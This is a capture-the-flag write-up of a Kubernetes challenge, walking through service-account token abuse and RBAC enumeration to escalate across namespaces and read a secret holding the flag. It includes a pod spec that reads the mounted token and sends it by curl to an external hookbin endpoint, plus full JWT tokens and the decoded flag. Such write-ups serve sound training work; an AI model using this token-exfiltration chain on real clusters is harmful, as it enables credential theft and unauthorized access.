# CyberArk CTF 2021 - Writeups  - CentauriKube (Kubernetes)

Category: Research, Points: 346

![ctf.JPG](images/ctf.JPG)

# CentauriKube (Kubernetes)  - Solution

By browsing to the link from CTF description [http://34.214.198.14:8080/](http://34.214.198.14:8080/) we get the following web page:

![k8spod.JPG](images/k8spod.JPG)

As we can see also from description - we are inside kubernetes pod.

According the description - Our target is to "move" from ```earth``` namespace (current namespace) to ```alpha-centauri``` namespace, then to ```alpha-centauri-b``` namespace and then we need to get [Kubernetes Secrets](https://kubernetes.io/docs/concepts/configuration/secret/) from ```centauri1337``` namespace.

So first, let's install [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/) by running the following:
```console
[cyborg-1337@earth]# apt-get update
...
[cyborg-1337@earth]# apt-get install sudo
...
[cyborg-1337@earth]# apt-get install curl
...
[cyborg-1337@earth]# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
...
[cyborg-1337@earth]# sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
```

The next step is to use ```kubectl```, We can do it using ServiceAccount token (JSON Web Token (JWT)).

ServiceAccount is an object managed by Kubernetes and used to provide an identity for processes that run in a pod.

Containers use the API for reading config, service info or to interact with k8's API, To do so - they are using the service account token.

Almost every pod will have a service account token mounted to one of the following paths:
```/run/secrets/kubernetes.io/serviceaccount/token``` or ```/var/run/secrets/kubernetes.io/serviceaccount/token```.

According [Kubernetes documentation](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/):
"When you create a pod, if you do not specify a service account, it is automatically assigned the default service account in the same namespace.".

We can find at this pod ServiceAccount token on the following path ```/var/run/secrets/kubernetes.io/serviceaccount/token```:
```console
[cyborg-1337@earth]# cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6ImZEZkl3bGtFVF9GYWpsTWx3ZDVqSEt2QVlaM3B4RnVwbDF3WWwyM0k3MGcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJlYXJ0aCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjeWJvcmctMTMzNy10b2tlbi05Z3ZjcyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJjeWJvcmctMTMzNyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6Ijg3YTFiNzk1LWJiYmUtNDFjNC1iMmVkLWUzMzdlNTliNTE4MiIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDplYXJ0aDpjeWJvcmctMTMzNyJ9.09IAfeemd4gGTF_cGwaAojPm5G05QnCkgUbbSzodCd1WDcN1HS0iQ-1wU7gdqN3pq3aHR9ayKgXFPDaUgXbnVIwEdoepsn5ldN3Q4ID5UBlLwJSlNC8XkxHLUEOYjdB-qZUWUAASCcP3540R7OZ8ldyd-0rlnR7r7L6rDMmP-JbwKnn3lsa2NBkeBYqjtsOowetgDFzS3px6dRN2uI2uLGPnjBGtSike-gHIy8bqGcNHR6parOVrfIhoHU6m6DrzkVn3NyB66SjBJ8E6jaW0Bzr_DGtvLcpmfjbiMd8gNph3kpvZdzTj0StFgXiszgDs0wS3mI5g1kd7DKzgRuv0Cg
```

To use ServiceAccount token with ```kubectl``` we need to make the [following steps](https://www.ibm.com/docs/en/cloud-paks/cp-management/2.0.0?topic=kubectl-using-service-account-tokens-connect-api-server):
```console
[cyborg-1337@earth]# kubectl config set-cluster cfc --server=https://kubernetes.default --certificate-authority=/etc/ssl/certs/ca-certificates.crt 
[cyborg-1337@earth]# kubectl config set-context cfc --cluster=cfc
[cyborg-1337@earth]# kubectl config set-credentials user --token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImZEZkl3bGtFVF9GYWpsTWx3ZDVqSEt2QVlaM3B4RnVwbDF3WWwyM0k3MGcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJlYXJ0aCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjeWJvcmctMTMzNy10b2tlbi05Z3ZjcyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJjeWJvcmctMTMzNyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6Ijg3YTFiNzk1LWJiYmUtNDFjNC1iMmVkLWUzMzdlNTliNTE4MiIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDplYXJ0aDpjeWJvcmctMTMzNyJ9.09IAfeemd4gGTF_cGwaAojPm5G05QnCkgUbbSzodCd1WDcN1HS0iQ-1wU7gdqN3pq3aHR9ayKgXFPDaUgXbnVIwEdoepsn5ldN3Q4ID5UBlLwJSlNC8XkxHLUEOYjdB-qZUWUAASCcP3540R7OZ8ldyd-0rlnR7r7L6rDMmP-JbwKnn3lsa2NBkeBYqjtsOowetgDFzS3px6dRN2uI2uLGPnjBGtSike-gHIy8bqGcNHR6parOVrfIhoHU6m6DrzkVn3NyB66SjBJ8E6jaW0Bzr_DGtvLcpmfjbiMd8gNph3kpvZdzTj0StFgXiszgDs0wS3mI5g1kd7DKzgRuv0Cg
[cyborg-1337@earth]# kubectl config set-context cfc --user=user
[cyborg-1337@earth]# kubectl config use-context cfc
```

Now we are able to run ```kubectl``` command, Let's try it:
```console
[cyborg-1337@earth]# kubectl --namespace=earth --insecure-skip-tls-verify get pods
NAME        READY   STATUS    RESTARTS   AGE
home-hint   1/1     Running   0          12d
```

Great, we are able to run ```kubectl``` command (NOTE: we need to use ```--namespace=earth``` namespace).

To know what we have access to run using this ServiceAccount token we can use [kubectl can-i](https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#-em-can-i-em-) command as follow:
```console
[cyborg-1337@earth]# kubectl --insecure-skip-tls-verify auth can-i --list --namespace=earth
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
pods.*                                          []                                    []               [list]

[cyborg-1337@earth]# kubectl --insecure-skip-tls-verify auth can-i --list --namespace=alpha-centauri
Resources                                       Non-Resource URLs                     Resource Names   Verbs
pods.*                                          []                                    []               [create get]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
serviceaccounts.*                               []                                    []               [list get]
podsecuritypolicies.*                           []                                    []               [use]

[cyborg-1337@earth]# kubectl --insecure-skip-tls-verify auth can-i --list --namespace=alpha-centauri-b
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

So as we can see on ```earth``` namespace we can use:
```console
pods.*                                          []                                    []               [list]
```

Which means we can get the lists of pods (like the previous command ```kubectl --namespace=earth --insecure-skip-tls-verify get pods```).

On ```alpha-centauri``` we can create/get pods, list/get [service accounts](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) and use [podsecuritypolicies](https://kubernetes.io/docs/concepts/policy/pod-security-policy/):
```console
pods.*                                          []                                    []               [create get]
serviceaccounts.*                               []                                    []               [list get]
podsecuritypolicies.*                           []                                    []               [use]
```

And on ```alpha-centauri-b``` nothing for now.

So currently our token allow us to create pods on ```alpha-centauri``` namespace and also to get/use serviceaccounts, It's mean we can create a pod with another service account (possible with addional capabilities) and then we can get the token from this  created pod.

So first, Let's get the service accounts list on ```alpha-centauri``` namespace as follow:
```console
[cyborg-1337@earth]# kubectl get serviceaccounts --insecure-skip-tls-verify  --namespace=alpha-centauri
NAME               SECRETS   AGE
alpha-centauri-a   1         12d
alpha-centauri-b   1         12d
default            1         17d
proxima            1         17d
```

Let's try to use ```alpha-centauri-b``` service account on our new pod.

To do that, We need to create [pod yaml](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/) with [service account section on pod yaml](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/):
```console
apiVersion: v1
kind: Pod
metadata:
  name: pod-with-sa
  labels:
    role: myrole
spec:
  serviceAccountName: alpha-centauri-b
  containers:
    - name: pod-with-sa
      image: curlimages/curl
```

Like that, We create a basic pod using ```alpha-centauri-b``` service account.

But we need to get the service account token from this pod, As remember we don't have any another access to pod except create,get (We cannot use exec/logs/etc...).

So to do that we can use ```curl``` command to send the service account token to web server which created by [https://hookbin.com/](https://hookbin.com/) (Change from [https://hookb.in/E77168x1mnSVjY66jNmw](https://hookb.in/E77168x1mnSVjY66jNmw) to your hookbin url), So let's add the relevant command to yaml:
```console
apiVersion: v1
kind: Pod
metadata:
  name: pod-with-sa
  labels:
    role: myrole
spec:
  serviceAccountName: alpha-centauri-b
  containers:
    - name: pod-with-sa
      image: curlimages/curl
      command: ["/bin/sh"]
      args: ["-c", 'token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl --header "Authorization: $token" https://hookb.in/E77168x1mnSVjY66jNmw']
```

Now the next step is to create the pod, After the pod status changed to complete we can see the service account token on web server:
```console
[cyborg-1337@earth]# ls
pod-sa.yaml
[cyborg-1337@earth]# cat pod-sa.yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-with-sa
  labels:
    role: myrole
spec:
  serviceAccountName: alpha-centauri-b
  containers:
    - name: pod-with-sa
      image: curlimages/curl
      command: ["/bin/sh"]
      args: ["-c", 'token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl --header "Authorization: $token" https://hookb.in/E77168x1mnSVjY66jNmw']

[cyborg-1337@earth]# kubectl --insecure-skip-tls-verify --namespace=alpha-centauri create -f pod-sa.yaml
pod/pod-with-sa created
[cyborg-1337@earth]# kubectl --insecure-skip-tls-verify --namespace=alpha-centauri get pod pod-with-sa
NAME          READY   STATUS             RESTARTS   AGE
pod-with-sa   0/1     CrashLoopBackOff   1          8s
[cyborg-1337@earth]# kubectl --insecure-skip-tls-verify --namespace=alpha-centauri get pod pod-with-sa
NAME          READY   STATUS      RESTARTS   AGE
pod-with-sa   0/1     Completed   2          28s
```

Now, After the pod status is Completed we can see the token on web server:

![token.JPG](images/token.JPG)

Which is:
```
eyJhbGciOiJSUzI1NiIsImtpZCI6ImZEZkl3bGtFVF9GYWpsTWx3ZDVqSEt2QVlaM3B4RnVwbDF3WWwyM0k3MGcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJhbHBoYS1jZW50YXVyaSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhbHBoYS1jZW50YXVyaS1iLXRva2VuLXZ4djI4Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFscGhhLWNlbnRhdXJpLWIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI2NzMxOTY4ZC1jYTZiLTQyNmYtYTZlNi1lM2ZlYTBjZGVmMmEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6YWxwaGEtY2VudGF1cmk6YWxwaGEtY2VudGF1cmktYiJ9.ORxg24s9n23DZ2X651kV_vPH1WRkwDQnE2-1j14u2djpaD_Qz6chGO4MGH6uVnTKMn0xv7MA2N7NisHCm9_NzvUW7wKAKOWJEZ6o0yhaewKr8kNcqKdbmokOqJ5asFy_JHa671TF6WMOAmWTzY-2kbzX8ys9kCvkgG6cFhpYTAmmlM13sSnYDiXOa4X4juBwzNMJh-7KSMwwAAYOjKKTHyDdOHpw3N8mJMS7oCIpNdc9NMgCemokKhu6IXHUfa5szlDtUdQt7QYecwprrDn4fhzQiFo_l6Nt4LdTB9T2fmeY5FtGC1pyfAqotevvrRWO_FCVyfVcQlz7wSt60Wtuqg
```

Now, Let's change ```kubectl``` token to this token and check again what we have access to run:
```console
[cyborg-1337@earth]# kubectl config set-credentials user --token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImZEZkl3bGtFVF9GYWpsTWx3ZDVqSEt2QVlaM3B4RnVwbDF3WWwyM0k3MGcifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJhbHBoYS1jZW50YXVyaSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhbHBoYS1jZW50YXVyaS1iLXRva2VuLXZ4djI4Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFscGhhLWNlbnRhdXJpLWIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiI2NzMxOTY4ZC1jYTZiLTQyNmYtYTZlNi1lM2ZlYTBjZGVmMmEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6YWxwaGEtY2VudGF1cmk6YWxwaGEtY2VudGF1cmktYiJ9.ORxg24s9n23DZ2X651kV_vPH1WRkwDQnE2-1j14u2djpaD_Qz6chGO4MGH6uVnTKMn0xv7MA2N7NisHCm9_NzvUW7wKAKOWJEZ6o0yhaewKr8kNcqKdbmokOqJ5asFy_JHa671TF6WMOAmWTzY-2kbzX8ys9kCvkgG6cFhpYTAmmlM13sSnYDiXOa4X4juBwzNMJh-7KSMwwAAYOjKKTHyDdOHpw3N8mJMS7oCIpNdc9NMgCemokKhu6IXHUfa5szlDtUdQt7QYecwprrDn4fhzQiFo_l6Nt4LdTB9T2fmeY5FtGC1pyfAqotevvrRWO_FCVyfVcQlz7wSt60Wtuqg
User "user" set.
[cyborg-1337@earth]# kubectl --insecure-skip-tls-verify auth can-i --list --namespace=alpha-centauri
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
secrets.*                                       []                                    []               [list get]
```

We can see that we can list/get secrets from ```alpha-centauri``` namespace, Let's try it:
```console
[cyborg-1337@earth]# kubectl --insecure-skip-tls-verify --namespace=alpha-centauri get secrets
NAME                           TYPE                                  DATA   AGE
alpha-centauri-a-token-lvgsq   kubernetes.io/service-account-token   3      12d
alpha-centauri-b-token-vxv28   kubernetes.io/service-account-token   3      12d
centauri1337                   Opaque                                1      17d
default-token-2rjmf            kubernetes.io/service-account-token   3      17d
proxima-token-nwpj4            kubernetes.io/service-account-token   3      17d
```

We can see the relevant secret ```centauri1337```, Let's read it:
```console
[cyborg-1337@earth]# kubectl --insecure-skip-tls-verify --namespace=alpha-centauri get secret centauri1337 -o yaml
apiVersion: v1
data:
  flag: Q1lCUnthMVBoYV9jM243YXVyMV8xc195MHVyX24zd19oMG0zfQo=
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","data":{"flag":"Q1lCUnthMVBoYV9jM243YXVyMV8xc195MHVyX24zd19oMG0zfQo="},"kind":"Secret","metadata":{"annotations":{},"name":"centauri1337","namespace":"alpha-centauri"}}
  creationTimestamp: "2021-06-29T07:24:23Z"
  name: centauri1337
  namespace: alpha-centauri
  resourceVersion: "458843"
  uid: 50542046-a97d-4473-aaec-4aff03b22388
type: Opaque
```

And this is the flag (base64 encoding) ```flag: Q1lCUnthMVBoYV9jM243YXVyMV8xc195MHVyX24zd19oMG0zfQo=``` which is:
```console
cyborg-1337@earth]# kubectl --insecure-skip-tls-verify --namespace=alpha-centauri get secret centauri1337 -o yaml | grep flag: | cut -d':' -f2 | xargs | base64 -d
CYBR{a1Pha_c3n7aur1_1s_y0ur_n3w_h0m3}
```

And the flag is ```CYBR{a1Pha_c3n7aur1_1s_y0ur_n3w_h0m3}```.